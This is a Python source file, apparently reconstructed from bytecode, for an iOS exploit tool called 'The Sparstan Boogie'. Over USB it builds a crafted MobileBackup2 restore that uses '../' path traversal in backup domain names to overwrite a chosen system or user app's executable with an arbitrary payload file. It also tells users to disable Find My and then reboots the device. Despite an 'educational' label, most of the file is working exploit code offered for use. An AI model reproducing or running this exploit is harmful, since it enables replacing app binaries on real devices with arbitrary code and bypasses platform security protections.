"""The Sparstan Boogie.

Archive/student build reconstructed from Python 3.12 bytecode of
sparse.pyc.
"""

import os
import sys
import urllib.parse as urllib
import traceback
import importlib.abc
import importlib.util
import types
import asyncio
import inspect
import time
import shutil
import importlib.metadata
from pathlib import Path
from tempfile import TemporaryDirectory

if sys.version_info[:2] != (3, 12):
    print(
        "This script expects Python 3.12 because the bundled PYZ archive was built for 3.12 bytecode."
    )
    print(f"Current interpreter: {sys.version.split()[0]}")
    print("Run with: /usr/local/bin/python3.12 sparse_tool/main.py")
    sys.exit(1)


MISSING_DEPS = []
MISSING_DEP_ERRORS = {}
_PYZ_IMPORTER_ERROR = None
_SYNC_LOOP = None
PYMOBILEDEVICE3_VERSION = None


class C:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN = "\033[36m"


def _c(text, color):
    if not sys.stdout.isatty():
        return text
    return f"{color}{text}{C.RESET}"


def _print_intro():
    script_name = os.path.basename(sys.argv[0]) if sys.argv else "sparse.py"
    print(_c("==============================================", C.CYAN))
    print(_c("           THE SPARSTAN BOOGIE", C.MAGENTA))
    print(_c("==============================================", C.CYAN))
    print(
        _c('"No plan survives first contact." - Helmuth von Moltke', C.YELLOW)
    )
    print("")
    print("")
    print(_c(f"Script: {script_name}", C.BLUE))
    print(
        _c(
            "Run: /usr/local/bin/python3.12 sparse_tool/main.py <from_path>",
            C.GREEN,
        )
    )
    print(
        _c(
            "Archive note: educational compatibility build for class and student documentation.",
            C.CYAN,
        )
    )
    print("")


REPLACEABLE_APP_NAMES = [
    "Activity",
    "Apple Books",
    "Apple TV",
    "Calculator",
    "Calendar",
    "Clock",
    "Compass",
    "Contacts",
    "FaceTime",
    "Files",
    "Find My",
    "Freeform",
    "Health",
    "Home",
    "iTunes Store",
    "Mail",
    "Maps",
    "Measure",
    "Music",
    "News",
    "Notes",
    "Podcasts",
    "Reminders",
    "Shortcuts",
    "Stocks",
    "Tips",
    "Translate",
    "TV",
    "Voice Memos",
    "Wallet",
    "Watch",
    "Weather",
]

LOW_IMPACT_TARGET_PRIORITY = [
    "Calculator",
    "Tips",
    "Clock",
    "Measure",
    "Voice Memos",
    "Stocks",
    "Weather",
    "News",
]


def _get_sync_loop():
    global _SYNC_LOOP
    if _SYNC_LOOP is None or _SYNC_LOOP.is_closed():
        _SYNC_LOOP = asyncio.new_event_loop()
        _SYNC_LOOP.set_exception_handler(_asyncio_exception_handler)
        asyncio.set_event_loop(_SYNC_LOOP)
    return _SYNC_LOOP


def _resolve(value):
    if inspect.isawaitable(value):
        loop_getter = getattr(value, "get_loop", None)
        value_loop = loop_getter() if callable(loop_getter) else None
        loop = value_loop or _get_sync_loop()
        return loop.run_until_complete(value)
    return value


def _sanitize_shadowed_stdlib():
    # Extracted bundles often contain files like struct.pyc in CWD/root.
    # Remove paths that shadow stdlib modules used by the loader.
    project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
    filtered = []
    for p in sys.path:
        probe = os.getcwd() if p == "" else p
        probe_abs = os.path.abspath(probe) if probe else ""
        if (
            probe_abs.startswith(project_root)
            and (
            os.path.isfile(os.path.join(probe, "struct.pyc"))
            or os.path.isfile(os.path.join(probe, "struct.py"))
            )
        ):
            continue
        filtered.append(p)
    sys.path[:] = filtered

    # If a local struct module was already imported before sanitization,
    # remove it so later imports resolve to stdlib struct.
    struct_mod = sys.modules.get("struct")
    struct_file = getattr(struct_mod, "__file__", "") if struct_mod else ""
    if struct_file and os.path.abspath(struct_file).startswith(project_root):
        sys.modules.pop("struct", None)

    # Force-load stdlib struct now that sys.path is sanitized.
    __import__("struct")


def _bootstrap_pyinstaller_imports():
    root = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
    internal = os.path.join(root, "_internal")
    pyz_path = os.path.join(root, "PYZ.pyz")
    if not os.path.isfile(pyz_path):
        return

    # Avoid mixing bundled native modules with host Python by default.
    # Set USE_BUNDLED_INTERNAL=1 only if you explicitly want those paths.
    if os.environ.get("USE_BUNDLED_INTERNAL") == "1" and os.path.isdir(internal):
        extra_paths = [
            internal,
            os.path.join(internal, "python3.12"),
            os.path.join(internal, "python3.12", "lib-dynload"),
        ]
        for p in extra_paths:
            if os.path.isdir(p) and p not in sys.path:
                sys.path.insert(0, p)

    try:
        # Prefer local loader copy to avoid requiring PyInstaller as a pip dep.
        from pyimod01_archive import ZlibArchiveReader
    except Exception:
        try:
            from PyInstaller.loader.pyimod01_archive import ZlibArchiveReader
        except Exception:
            return

    archive = ZlibArchiveReader(pyz_path, 0, check_pymagic=False)

    class _PYZFinder(importlib.abc.MetaPathFinder, importlib.abc.Loader):
        def find_spec(self, fullname, path=None, target=None):
            if not (fullname == "exploit" or fullname.startswith("exploit.")):
                return None
            if fullname not in archive.toc:
                return None
            is_pkg = bool(archive.toc[fullname][0] in (1, 3))
            return importlib.util.spec_from_loader(fullname, self, is_package=is_pkg)

        def create_module(self, spec):
            return None

        def exec_module(self, module):
            code = archive.extract(module.__name__)
            if not isinstance(code, types.CodeType):
                raise ImportError(f"Unable to load module from PYZ: {module.__name__}")
            module.__file__ = f"{pyz_path}:{module.__name__}"
            if module.__spec__ and module.__spec__.submodule_search_locations is not None:
                module.__path__ = [f"{pyz_path}:{module.__name__}"]
            exec(code, module.__dict__)

    if not any(type(h).__name__ == "_PYZFinder" for h in sys.meta_path):
        sys.meta_path.insert(0, _PYZFinder())


try:
    _sanitize_shadowed_stdlib()
    _bootstrap_pyinstaller_imports()
except Exception as e:
    _PYZ_IMPORTER_ERROR = e

try:
    from exploit.restore import restore_file
except ImportError as e:
    restore_file = None
    MISSING_DEPS.append("exploit.restore")
    MISSING_DEP_ERRORS["exploit.restore"] = str(e)

try:
    from pymobiledevice3 import usbmux
    from pymobiledevice3.exceptions import PyMobileDevice3Exception
    from pymobiledevice3.lockdown import create_using_usbmux
    from pymobiledevice3.services.diagnostics import DiagnosticsService
    from pymobiledevice3.services.installation_proxy import InstallationProxyService
    from pymobiledevice3.services.mobilebackup2 import Mobilebackup2Service
except ImportError as e:
    usbmux = None
    create_using_usbmux = None
    DiagnosticsService = None
    InstallationProxyService = None
    Mobilebackup2Service = None

    class PyMobileDevice3Exception(Exception):
        pass

    MISSING_DEPS.append("pymobiledevice3")
    MISSING_DEP_ERRORS["pymobiledevice3"] = str(e)

try:
    PYMOBILEDEVICE3_VERSION = importlib.metadata.version("pymobiledevice3")
except Exception:
    PYMOBILEDEVICE3_VERSION = None


def _major_version(version_text):
    if not version_text:
        return None
    try:
        return int(str(version_text).split(".", 1)[0])
    except Exception:
        return None


def get_connected_usb_device():
    devices = _resolve(usbmux.list_devices())
    for device in devices:
        if not device.is_usb:
            continue
        lockdown = _resolve(create_using_usbmux(serial=device.serial))
        return lockdown
    return None


async def _get_connected_usb_device_async():
    devices = usbmux.list_devices()
    if inspect.isawaitable(devices):
        devices = await devices
    for device in devices:
        if not device.is_usb:
            continue
        lockdown = create_using_usbmux(serial=device.serial)
        if inspect.isawaitable(lockdown):
            lockdown = await lockdown
        return lockdown
    return None


def get_tips_app_path(lockdown):
    apps_json = _resolve(
        InstallationProxyService(lockdown).get_apps(
            application_type="System", calculate_sizes=False
        )
    )
    return apps_json.get("com.apple.tips", {}).get("Path", "")


def _name_for_app(meta, bundle_id):
    return (
        meta.get("CFBundleDisplayName")
        or meta.get("CFBundleName")
        or bundle_id.split(".")[-1]
    )


def _collect_replaceable_targets(apps_json):
    allowed = {n.lower() for n in REPLACEABLE_APP_NAMES}
    targets = []
    for bundle_id, meta in apps_json.items():
        path = meta.get("Path")
        if not path:
            continue
        name = _name_for_app(meta, bundle_id)
        if name.lower() not in allowed:
            continue
        executable = meta.get("CFBundleExecutable") or os.path.splitext(os.path.basename(path))[0]
        targets.append(
            {
                "name": name,
                "bundle_id": bundle_id,
                "path": path,
                "executable": executable,
            }
        )
    targets.sort(key=lambda x: (x["name"].lower(), x["bundle_id"]))
    return targets


def _collect_user_targets(apps_json):
    targets = []
    for bundle_id, meta in apps_json.items():
        path = meta.get("Path")
        if not path:
            continue
        name = _name_for_app(meta, bundle_id)
        executable = meta.get("CFBundleExecutable") or os.path.splitext(os.path.basename(path))[0]
        targets.append(
            {
                "name": name,
                "bundle_id": bundle_id,
                "path": path,
                "executable": executable,
            }
        )
    targets.sort(key=lambda x: (x["name"].lower(), x["bundle_id"]))
    return targets


def _resolve_target_binary_path(selected):
    raw_path = (selected.get("path") or "").replace("/private", "")
    executable = selected.get("executable") or ""
    if not raw_path:
        raise RuntimeError("Target app path missing.")

    # Case 1: metadata already points to the executable file.
    if raw_path.endswith(f"/{executable}") and executable:
        return raw_path

    # Case 2: metadata points to app bundle directory.
    if raw_path.endswith(".app"):
        if executable:
            return f"{raw_path}/{executable}"
        bundle_name = os.path.splitext(os.path.basename(raw_path))[0]
        return f"{raw_path}/{bundle_name}"

    # Case 3: fallback for unexpected formats.
    if executable and not raw_path.endswith(f"/{executable}"):
        return f"{raw_path}/{executable}"
    return raw_path


def _filter_targets_by_bundle_prefix(targets, prefix):
    if not prefix:
        return targets
    p = prefix.lower()
    return [t for t in targets if t.get("bundle_id", "").lower().startswith(p)]


def _select_target_app(targets, preferred=None):
    if not targets:
        return None

    if preferred:
        p = preferred.lower()
        for t in targets:
            if t["bundle_id"].lower() == p or t["name"].lower() == p:
                return t

    for wanted in LOW_IMPACT_TARGET_PRIORITY:
        for t in targets:
            if t["name"].lower() == wanted.lower():
                return t

    for t in targets:
        if t["name"].lower() == "tips":
            return t

    return targets[0]


def _print_low_impact_target_guidance(targets, preferred=None):
    if preferred:
        return

    names = {t["name"].lower(): t["name"] for t in targets}
    available = []
    missing = []
    for app in LOW_IMPACT_TARGET_PRIORITY:
        if app.lower() in names:
            available.append(app)
        else:
            missing.append(app)

    print(_c("Recommended low-impact targets for best OS stability:", C.CYAN))
    print("  " + ", ".join(available) if available else _c("  None detected.", C.YELLOW))
    if missing:
        print(
            _c(
                "Some low-impact targets are missing. Install/restore these before beginning if possible:",
                C.YELLOW,
            )
        )
        print("  " + ", ".join(missing))
        print(
            _c(
                "Suggestion: install the missing Apple apps from the App Store first, then rerun.",
                C.YELLOW,
            )
        )
    print("")


def _print_target_choices(targets, selected):
    print(_c("Detected replaceable built-in app targets:", C.CYAN))
    for t in targets:
        marker = "=> " if t is selected else "   "
        color = C.MAGENTA if t is selected else C.BLUE
        print(
            f"{marker}{_c(t['name'], color)} "
            f"({_c(t['bundle_id'], C.YELLOW)})"
        )
    if selected:
        print(
            _c(
                f"Selected target: {selected['name']} ({selected['bundle_id']})",
                C.GREEN,
            )
        )


def restart_device(lockdown):
    diagnostics = DiagnosticsService(lockdown)
    _resolve(diagnostics.restart())


def _wait_for_usb_device(timeout_seconds=120, poll_seconds=2, reason="connect"):
    if reason == "reconnect":
        print(_c("Waiting for device to reconnect over USB...", C.CYAN))
    else:
        print(_c("Waiting for USB device...", C.CYAN))
    deadline = time.time() + timeout_seconds
    while time.time() < deadline:
        try:
            devices = _resolve(usbmux.list_devices())
            if any(getattr(device, "is_usb", False) for device in devices):
                if reason == "reconnect":
                    print(_c("Device reattached.", C.GREEN))
                    print(
                        _c(
                            "You can now unlock the device and run the script again.",
                            C.YELLOW,
                        )
                    )
                return True
        except Exception:
            # During reboot, usbmux queries can fail transiently.
            pass
        time.sleep(poll_seconds)

    if reason == "reconnect":
        print(
            _c(
                "Timed out waiting for USB reconnect. Unlock the device, reconnect USB, then retry.",
                C.YELLOW,
            )
        )
    else:
        print(
            _c(
                "No USB device detected. Connect device, unlock it, tap Trust, then retry.",
                C.YELLOW,
            )
        )
    return False


def restore_tips_app(from_path, to_path, lockdown):
    print(_c("[Restore]", C.CYAN))
    print(f"  {_c('Source file:', C.YELLOW)} {_c(from_path, C.GREEN)}")
    print(f"  {_c('Target path:', C.YELLOW)} {_c(to_path, C.MAGENTA)}")
    e_contents = open(from_path, "rb").read()
    # The bundled exploit.restore uses sync context management that breaks on
    # newer pymobiledevice3 versions. Build the same backup payload and restore
    # using the async API directly.
    from exploit import backup as exploit_backup

    back = exploit_backup.Backup(
        files=[
            exploit_backup.Directory("", "RootDomain"),
            exploit_backup.Directory("Library", "RootDomain"),
            exploit_backup.Directory("Library/Preferences", "RootDomain"),
            exploit_backup.ConcreteFile(
                "Library/Preferences/temp",
                "RootDomain",
                owner=501,
                group=501,
                contents=e_contents,
                inode=0,
            ),
            exploit_backup.Directory(
                "", f"SysContainerDomain-../../../../../../../../var/backup{os.path.dirname(to_path)}", owner=501, group=501
            ),
            exploit_backup.ConcreteFile(
                "",
                f"SysContainerDomain-../../../../../../../../var/backup{to_path}",
                owner=501,
                group=501,
                contents=b"",
                inode=0,
            ),
            exploit_backup.ConcreteFile(
                "",
                "SysContainerDomain-../../../../../../../../var/.backup.i/var/root/Library/Preferences/temp",
                owner=501,
                group=501,
                contents=b"",
            ),
            exploit_backup.ConcreteFile(
                "", "SysContainerDomain-../../../../../../../../crash_on_purpose", contents=b""
            ),
        ]
    )

    def _resolve_restore_identifier(client):
        udid = getattr(client, "udid", None)
        if not isinstance(udid, str) or not udid.strip():
            try:
                udid = client.get_value(key="UniqueDeviceID")
            except Exception:
                udid = None
        if not isinstance(udid, str) or not udid.strip():
            raise RuntimeError("Unable to resolve a valid device UDID for restore.")
        return udid.strip()

    def _normalize_backup_layout(backup_dir, restore_identifier):
        backup_root = Path(backup_dir)
        if not restore_identifier:
            return ""

        required = ("Info.plist", "Manifest.plist", "Status.plist")
        udid_dir = backup_root / restore_identifier
        if all((udid_dir / name).exists() for name in required):
            return ""

        # Legacy payload writer may emit a flat layout. Move it under UDID.
        if all((backup_root / name).exists() for name in required):
            udid_dir.mkdir(parents=True, exist_ok=True)
            for item in backup_root.iterdir():
                if item.name == restore_identifier:
                    continue
                shutil.move(str(item), str(udid_dir / item.name))
            return ""

        # Fallback: use flat source if required files are still at root.
        return "." if all((backup_root / name).exists() for name in required) else ""

    async def _do_restore():
        with TemporaryDirectory() as backup_dir:
            back.write_to_directory(Path(backup_dir))
            restore_identifier = _resolve_restore_identifier(lockdown)
            source_identifier = _normalize_backup_layout(backup_dir, restore_identifier)
            attempts = [
                {
                    "system": True,
                    "reboot": False,
                    "copy": False,
                    "settings": True,
                    "source": source_identifier or restore_identifier,
                    "skip_apps": False,
                },
                {
                    # Compatibility retry for MBErrorDomain/205 class failures.
                    "system": True,
                    "reboot": False,
                    "copy": False,
                    "settings": False,
                    "source": source_identifier or restore_identifier,
                    "skip_apps": True,
                },
            ]
            last_error = None
            for idx, opts in enumerate(attempts, 1):
                try:
                    # Re-acquire lockdown session for retry attempts after transport/state errors.
                    active_lockdown = lockdown
                    if idx != 1:
                        refreshed = await _get_connected_usb_device_async()
                        active_lockdown = refreshed or lockdown
                    async with Mobilebackup2Service(active_lockdown) as mb:
                        mb.lockdown.udid = restore_identifier
                        await mb.restore(backup_dir, **opts)
                    return
                except Exception as exc:
                    last_error = exc
                    msg = str(exc)
                    if "MBErrorDomain/205" in msg and idx < len(attempts):
                        print(
                            _c(
                                "Restore hit MBErrorDomain/205. Retrying with compatibility options...",
                                C.YELLOW,
                            )
                        )
                        continue
                    raise
            if last_error is not None:
                raise last_error

    _resolve(_do_restore())


def handle_restore_exception(e, lockdown):
    err = str(e)
    if "MBErrorDomain/205" in err:
        print(
            _c(
                "Restore failed with MBErrorDomain/205. "
                "This archive build is not compatible with your current pymobiledevice3 version.",
                C.RED,
            )
        )
        if PYMOBILEDEVICE3_VERSION:
            print(_c(f"Detected pymobiledevice3: {PYMOBILEDEVICE3_VERSION}", C.YELLOW))
        print(_c("Recommended fix:", C.CYAN))
        print("  python3.12 -m pip uninstall -y pymobiledevice3")
        print("  python3.12 -m pip install pymobiledevice3==4.25.1")
        print(
            _c(
                "Then reconnect the device, trust/unlock, and rerun the command.",
                C.YELLOW,
            )
        )
        return

    if "Find My" in str(e):
        print("Find My must be disabled in order to use this tool.")
        print(
            "Disable Find My from Settings (Settings -> [Your Name] -> Find My) and then try again."
        )
        return

    if _is_transient_usb_error(e):
        print(
            _c(
                "USB/session connection dropped during restore. "
                "Keep device connected and unlocked, then retry.",
                C.YELLOW,
            )
        )
        _wait_for_usb_device(timeout_seconds=30, poll_seconds=2, reason="connect")
        return

    if "crash_on_purpose" not in str(e):
        try:
            restart_device(lockdown)
            _wait_for_usb_device(reason="reconnect")
        except Exception:
            print(
                _c(
                    "Could not request device restart because connection was lost. "
                    "Reconnect/unlock device and retry.",
                    C.YELLOW,
                )
            )
        raise e

    print("Installed payload")
    print("Success. Rebooting your device...")
    restart_device(lockdown)
    _wait_for_usb_device(reason="reconnect")
    print("Remember to turn Find My back on!")


def _is_device_locked_error(exc):
    msg = str(exc).lower()
    compact = msg.replace(" ", "").replace("_", "")
    locked_markers = [
        "passcode",
        "locked",
        "device is locked",
        "password protected",
        "passwordprotected",
        "passwordrequirederror",
        "invalid hostid",
    ]
    return any(marker in msg or marker in compact for marker in locked_markers)


def _is_transient_usb_error(exc):
    msg = str(exc).lower()
    markers = [
        "connectionterminatederror",
        "connection terminated",
        "connectionreseterror",
        "device not found",
        "devicenotfounderror",
        "broken pipe",
        "timed out",
    ]
    return any(marker in msg for marker in markers)


def _asyncio_exception_handler(loop, context):
    exc = context.get("exception")
    msg = context.get("message", "")
    if _is_device_locked_error(exc or msg) or _is_transient_usb_error(exc or msg):
        return
    loop.default_exception_handler(context)


def main():
    _print_intro()

    if _PYZ_IMPORTER_ERROR is not None:
        print(
            _c(
                f"Failed to initialize PYZ importer: {_PYZ_IMPORTER_ERROR}",
                C.RED,
            )
        )
        sys.exit(1)

    if MISSING_DEPS:
        print(
            _c(
                "Missing runtime dependencies: " + ", ".join(sorted(set(MISSING_DEPS))),
                C.RED,
            )
        )
        for dep in sorted(set(MISSING_DEPS)):
            if dep in MISSING_DEP_ERRORS:
                print(f" - {dep}: {MISSING_DEP_ERRORS[dep]}")
        print(
            "This reconstructed script requires modules from the original app bundle or environment."
        )
        print("At minimum, install/restore: pymobiledevice3 and exploit.restore")
        sys.exit(1)

    major = _major_version(PYMOBILEDEVICE3_VERSION)
    if major is not None and major >= 9:
        print(
            _c(
                "Detected pymobiledevice3 "
                f"{PYMOBILEDEVICE3_VERSION}, which is known to break this archive restore flow.",
                C.YELLOW,
            )
        )
        print(_c("Use this known-compatible version before continuing:", C.CYAN))
        print("  python3.12 -m pip uninstall -y pymobiledevice3")
        print("  python3.12 -m pip install pymobiledevice3==4.25.1")
        sys.exit(1)

    args = sys.argv[1:]
    from_path = None
    preferred_target = None
    list_only = False
    target_user_apps = False
    target_bundle_prefix = None

    i = 0
    while i < len(args):
        arg = args[i]
        if arg == "--list-targets":
            list_only = True
            i += 1
            continue
        if arg == "--user-apps":
            target_user_apps = True
            i += 1
            continue
        if arg == "--target":
            if i + 1 >= len(args):
                print(_c("Missing value for --target", C.RED))
                sys.exit(1)
            preferred_target = urllib.unquote(args[i + 1])
            i += 2
            continue
        if arg == "--target-bundle-prefix":
            if i + 1 >= len(args):
                print(_c("Missing value for --target-bundle-prefix", C.RED))
                sys.exit(1)
            target_bundle_prefix = urllib.unquote(args[i + 1]).strip()
            i += 2
            continue
        if from_path is None:
            from_path = urllib.unquote(arg)
            i += 1
            continue
        if preferred_target is None:
            preferred_target = urllib.unquote(arg)
            i += 1
            continue
        print(_c(f"Unexpected argument: {arg}", C.RED))
        sys.exit(1)

    if from_path is None and not list_only:
        print(
            _c(
                "Usage: sparse.py <from_path> [target_app_name_or_bundle_id]",
                C.YELLOW,
            )
        )
        print("")
        print(_c("Usage extensions:", C.CYAN))
        print(_c("  1) --list-targets", C.BLUE))
        print(_c("  2) --target <app_name_or_bundle_id>", C.BLUE))
        print(_c("  3) --user-apps (target user-installed apps instead of system apps)", C.BLUE))
        print(_c("  4) --target-bundle-prefix <prefix>", C.BLUE))
        print(_c("  5) See CLASS_USAGE.md for class examples", C.BLUE))
        sys.exit(1)

    lockdown = None
    try:
        lockdown = get_connected_usb_device()
        if lockdown is None:
            if _wait_for_usb_device(timeout_seconds=20, poll_seconds=2, reason="connect"):
                lockdown = get_connected_usb_device()
            if lockdown is None:
                print(_c("NoDeviceConnectedError", C.RED))
                sys.exit()

        app_type = "User" if target_user_apps else "System"
        apps_json = _resolve(
            InstallationProxyService(lockdown).get_apps(
                application_type=app_type, calculate_sizes=False
            )
        )
        targets = _collect_user_targets(apps_json) if target_user_apps else _collect_replaceable_targets(apps_json)
        targets = _filter_targets_by_bundle_prefix(targets, target_bundle_prefix)
        if not targets:
            if target_user_apps:
                if target_bundle_prefix:
                    print(
                        _c(
                            f"No user-installed target apps detected for prefix: {target_bundle_prefix}",
                            C.RED,
                        )
                    )
                else:
                    print(_c("No user-installed target apps detected.", C.RED))
            else:
                if target_bundle_prefix:
                    print(
                        _c(
                            f"No replaceable built-in target apps detected for prefix: {target_bundle_prefix}",
                            C.RED,
                        )
                    )
                else:
                    print(_c("No replaceable built-in target apps detected.", C.RED))
            sys.exit()

        if not target_user_apps:
            _print_low_impact_target_guidance(targets, preferred_target)

        selected = _select_target_app(targets, preferred_target)
        _print_target_choices(targets, selected)
        if list_only:
            return
        if selected is None:
            print(_c("Could not select target app.", C.RED))
            sys.exit()

        to_path = _resolve_target_binary_path(selected)

        restore_tips_app(from_path, to_path, lockdown)
    except PyMobileDevice3Exception as e:
        if _is_device_locked_error(e):
            print(
                _c(
                    "Device appears to be locked or passcode-protected. "
                    "Unlock the device and trust this computer, then retry.",
                    C.RED,
                )
            )
            return
        if _is_transient_usb_error(e):
            print(
                _c(
                    "Connection to device was interrupted. Keep device unlocked and USB connected, then retry.",
                    C.YELLOW,
                )
            )
            _wait_for_usb_device(timeout_seconds=30, poll_seconds=2, reason="connect")
            return
        handle_restore_exception(e, lockdown)
    except Exception:
        e = traceback.format_exc()
        if _is_device_locked_error(e):
            print(
                _c(
                    "Device appears to be locked or passcode-protected. "
                    "Unlock the device and trust this computer, then retry.",
                    C.RED,
                )
            )
            return
        if _is_transient_usb_error(e):
            print(
                _c(
                    "Connection to device was interrupted. Keep device unlocked and USB connected, then retry.",
                    C.YELLOW,
                )
            )
            _wait_for_usb_device(timeout_seconds=30, poll_seconds=2, reason="connect")
            return
        print(e)


if __name__ == "__main__":
    main()
